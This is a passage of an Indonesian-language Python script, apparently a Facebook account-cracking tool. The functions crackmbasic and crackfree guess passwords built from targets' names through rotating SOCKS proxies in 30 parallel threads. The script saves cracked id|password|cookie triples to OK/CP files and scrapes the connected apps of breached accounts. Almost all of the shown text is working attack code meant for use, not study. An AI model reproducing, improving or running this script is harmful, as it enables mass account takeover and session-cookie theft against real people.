						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f"{P}└──── {HA}{idf}|{pw}                  \n{HA}{kuki}{P}")
					print(f"      {H}{infoakun}{P}")
					os.popen("play-audio data/audio/ok.mp3")
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## MBASIC ##########
def crackmbasic(idf,__Ang__):
	global loop,ok,cp
	prog.update(des,description=f'[deep_blue3]{(loop)}/{len(id)}[/] OK : [green]{(ok)}[/] CP : [yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	for pw in __Ang__:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cross-origin','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','save-data': 'on','content-length': '11','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'XMLHttpRequest','x-content-type-options': 'nosniff','x-xss-protection': '0','x-frame-options': 'DENY','x-fb-debug': 'rLteCiRBDaKdj7COLSbKAuBvDX6ZnjbOcXKAxbiugT6cRfRDSZuCQvLtx+brzBc6ri0AHHP/NaRaSzYRoj6fig==','method': 'GET','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cross-origin','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','connection': 'keep-alive','vary': 'accept-encoding','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{P}└──── {KU}{idf}|{pw}            {P}")
				os.popen("play-audio data/audio/cp.mp3")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"UCWEB/2.0 (Windows; U; wds 7.10; zh-CN; NOKIA; Nokia 610C) U2/1.0.0 UCBrowser/3.0.1.302 U2/1.0.0 Mobile"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f"{P}└──── {HA}{idf}|{pw}                  \n{HA}{kuki}{P}")
					os.popen("play-audio data/audio/ok.mp3")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f"{P}└──── {HA}{idf}|{pw}                  \n{HA}{kuki}{P}")
					print(f"      {H}{infoakun}{P}")
					os.popen("play-audio data/audio/ok.mp3")
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## FREE ##########
def crackfree(idf,__Ang__):
	global loop,ok,cp
	prog.update(des,description=f'[deep_pink3]{(loop)}/{len(id)}[/] OK : [green]{(ok)}[/] CP : [yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	for pw in __Ang__:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cross-origin','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','save-data': 'on','content-length': '11','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'XMLHttpRequest','x-content-type-options': 'nosniff','x-xss-protection': '0','x-frame-options': 'DENY','x-fb-debug': 'rLteCiRBDaKdj7COLSbKAuBvDX6ZnjbOcXKAxbiugT6cRfRDSZuCQvLtx+brzBc6ri0AHHP/NaRaSzYRoj6fig==','method': 'GET','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cross-origin','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','connection': 'keep-alive','vary': 'accept-encoding','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{P}└──── {KU}{idf}|{pw}            {P}")
				os.popen("play-audio data/audio/cp.mp3")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"UCWEB/2.0 (Windows; U; wds 7.10; zh-CN; NOKIA; Nokia 610C) U2/1.0.0 UCBrowser/3.0.1.302 U2/1.0.0 Mobile"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f"{P}└──── {HA}{idf}|{pw}                  \n{HA}{kuki}{P}")
					os.popen("play-audio data/audio/ok.mp3")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f"{P}└──── {HA}{idf}|{pw}                  \n{HA}{kuki}{P}")
					print(f"      {H}{infoakun}{P}")
					os.popen("play-audio data/audio/ok.mp3")
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## INFORMASI TOOLS ##########
def informasi():
	print("\n%s#%s Developer"%(M,P))
	jalan("%s└────%s Moch Aang Ardiansyah XD"%(H,P));time.sleep(1)
	print("\n%s#%s My team"%(M,P))
	jalan("%s└────%s Jecko Ramadhan"%(H,P));time.sleep(1)
	jalan("%s└────%s Hendri - YumasaaTzy"%(H,P));time.sleep(1)
	jalan("%s└────%s Aldi Bactiar Rifai - Xenzi Gans"%(H,P));time.sleep(1)
	jalan("%s└────%s Najib XD - Yuume"%(H,P));time.sleep(1)
	jalan("%s└────%s Angga Adiy"%(H,P));time.sleep(1)
	jalan("%s└────%s Fakhri - Mbokey Bhizer"%(H,P));time.sleep(1)
	jalan("%s└────%s Mr Risky - Dumai 991"%(H,P));time.sleep(1)
	print("\n%s#%s Message me"%(M,P))
	jalan("%s└────%s Jangan menjadi pelangi untuk orang yang buta warna"%(H,P));time.sleep(1)
	jalan("%s└────%s Sekian, terimakasih atas dukungan anda"%(H,P));time.sleep(1)
	input("\n%s#%s Tekan enter untuk kembali "%(M,P));login()
########## PASSWORD TAMBAHAN ##########
def kunaon():
	global prog,des
	jln = f"[{O2}•{P2}] Akun {H2}OK {P2}: {H2}OK/{okc}\n{P2}[{O2}•{P2}] Akun {K2}CP {P2}: {K2}CP/{cpc}{P2}"
	cetak(nel(jln, title="•CRACK DIMULAI •"))
	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for AangXD in id2:
				idf,__celeng__ = AangXD.split('|')[0],AangXD.split('|')[1].lower()
				__kiya__ = __celeng__.split(' ')[0]
				__Ang__ = []
				if len(__celeng__)<6:
					if len(__kiya__)<3:
						pass
					else:
						__Ang__.append(__kiya__+'123')
						__Ang__.append(__kiya__+'1234')
						__Ang__.append(__kiya__+'12345')
				else:
					if len(__kiya__)<3:
						__Ang__.append(__celeng__)
					else:
						__Ang__.append(__celeng__)
						__Ang__.append(__kiya__+'123')
						__Ang__.append(__kiya__+'1234')
						__Ang__.append(__kiya__+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						__Ang__.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,__Ang__)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,__Ang__)
				elif 'free' in method:
					pool.submit(crackfree,idf,__Ang__)
				else:
					pool.submit(crackmbasic,idf,__Ang__)
		sai = f"[{O2}•{P2}] Total akun {H2}OK{P2} : {H2}{ok}{P2}\n[{O2}•{P2}] Total akun {K2}CP{P2} : {K2}{cp}{P2}"
		cetak(nel(sai, title="•CRACK SELESAI •"))
########## PROGRAM DONE ##########
if __name__=='__main__':
	login()